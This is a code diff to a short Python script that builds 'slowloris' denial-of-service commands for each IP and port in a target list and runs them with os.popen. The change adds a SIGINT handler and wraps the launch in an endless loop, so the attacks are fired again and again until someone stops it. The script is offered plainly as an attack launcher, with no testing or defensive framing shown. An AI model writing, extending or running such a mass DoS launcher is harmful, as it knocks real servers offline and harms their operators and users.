@@ -1,7 +1,7 @@
 import os
+import signal
 import sys
 import time
-
 
 cmds = []
 
@@ -15,6 +15,11 @@ def build_cmd(target_list):
 			cmd = 'slowloris ' + ip + ' -s 1300' + ' -p ' + p
 			cmds.append(cmd)
 			print(cmd)
+
+
+def terminateProcess(signal, frame):
+	print('(SIGTERM) terminating the processes', signal)
+	sys.exit()
 
 
 def main() -> int:
@@ -41,9 +46,9 @@ def main() -> int:
     # executing the commands
 	for cmd in cmds:
 		os.popen(cmd)
-	
-	return 0
 
 
 if __name__ == '__main__':
-    main()
+	while True: # to endlessly wait for SIGINT
+		main()
+		signal.signal(signal.SIGINT, terminateProcess)
